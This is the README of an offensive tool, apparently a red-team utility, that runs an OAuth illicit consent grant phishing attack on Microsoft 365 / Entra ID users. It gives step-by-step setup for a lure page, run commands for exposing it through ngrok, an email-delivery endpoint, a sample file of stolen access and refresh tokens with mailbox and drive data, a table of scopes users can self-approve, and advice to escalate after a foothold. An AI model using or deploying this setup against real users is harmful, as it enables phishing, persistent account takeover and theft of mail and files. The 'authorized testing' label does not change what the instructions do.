# consent_grab

Azure AD / Entra ID illicit consent grant attack demonstrator for authorized red-team engagements.

Hosts a phishing-style landing page that drives a victim through an OAuth consent flow. Once the victim signs in and consents, the authorization code is exchanged for access and refresh tokens, Microsoft Graph is queried to prove access, and everything is saved to disk.

> **For authorized security testing only.**

## How it works

1. Attacker registers a multi-tenant app in their own Azure AD tenant
2. Tool hosts a lure page with a "Open in Microsoft 365" button
3. Victim clicks the link, signs in with their work account, and consents to the requested permissions
4. Microsoft redirects back to `/callback` with an authorization code
5. Tool exchanges the code for tokens and calls Graph to demonstrate access
6. Tokens are written to the `loot/` directory

## Requirements

- Python 3.8+
- A registered Azure AD app (see [Setup](#azure-app-registration-setup))

```bash
pip install -r requirements.txt
```

## Azure App Registration Setup

1. Go to **Azure portal → App registrations → New registration**
2. Name it anything; under **Supported account types** choose **Accounts in any organizational directory (Multitenant)**
3. Add a **Web** redirect URI: `http://<your-host>:<port>/callback`
4. Under **Certificates & secrets** create a new client secret and copy the value
5. Under **API permissions** add only the delegated permissions you need — start with `User.Read` (does not require admin consent)
6. Copy the **Application (client) ID** from the Overview page

> Requesting high-privilege permissions (`Mail.Read`, `Files.Read.All`, etc.) triggers an admin-approval wall in most tenants unless the app has a verified publisher. Start with `User.Read` and escalate after the initial foothold.

## Usage

```
python3 consent_grab.py --client-id <ID> --client-secret <SECRET> [options]
```

### Required

| Flag | Description |
|---|---|
| `--client-id` | Application (client) ID from the app registration |
| `--client-secret` | Client secret value |

### Optional

| Flag | Default | Description |
|---|---|---|
| `--port` | `5000` | Port to listen on |
| `--host` | `0.0.0.0` | Interface to bind |
| `--public-url` | `http://localhost:<port>` | Externally reachable URL (use your ngrok/VPS address) |
| `--redirect-uri` | `<public-url>/callback` | Override redirect URI if it differs from the default |
| `--scope` | last used | Space-separated OAuth scopes to request; persisted across runs |
| `--pretext` | `Microsoft 365 Document` | Lure text shown on the landing page |
| `--loot-dir` | `loot/` | Directory to write captured tokens to |
| `--debug` | off | Run Flask in debug mode |

### Examples

Local test:
```bash
python3 consent_grab.py \
  --client-id   xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx \
  --client-secret xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx \
  --port        8080
```

With ngrok / external host:
```bash
python3 consent_grab.py \
  --client-id   xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx \
  --client-secret xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx \
  --port        8080 \
  --public-url  https://abc123.ngrok.io
```

Custom scope:
```bash
python3 consent_grab.py \
  --client-id   xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx \
  --client-secret xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx \
  --port        8080 \
  --scope       "openid profile email User.Read offline_access Mail.Read"
```

The `--scope` value is saved automatically and becomes the default for the next run.

## Endpoints

| Endpoint | Purpose |
|---|---|
| `/` | Lure landing page |
| `/go` | Direct redirect to the Microsoft consent flow (for link-in-email delivery) |
| `/callback` | OAuth redirect URI — captures the code, exchanges for tokens, saves loot |
| `/health` | Returns configured redirect URI |

## Output

Tokens are written to `loot/<timestamp>_<UPN>.json`:

```json
{
  "captured_at": "2026-01-01T12:00:00",
  "victim_ip": "1.2.3.4",
  "tokens": {
    "access_token": "...",
    "refresh_token": "...",
    "scope": "User.Read openid profile email"
  },
  "graph": {
    "me": { "status": 200, "body": { "userPrincipalName": "alice@contoso.com", ... } },
    "messages": { ... },
    "drive": { ... }
  }
}
```

## Scope reference

Permissions that do **not** require admin consent (user can self-approve):

| Scope | Access granted |
|---|---|
| `User.Read` | Sign in, read own profile |
| `openid profile email` | OIDC identity token |
| `offline_access` | Refresh token (persistent access) |
| `Calendars.Read` | Read calendar |
| `Contacts.Read` | Read contacts |
| `Mail.Read` | Read email *(may require admin in strict tenants)* |
| `Files.Read.All` | Read all files *(may require admin in strict tenants)* |
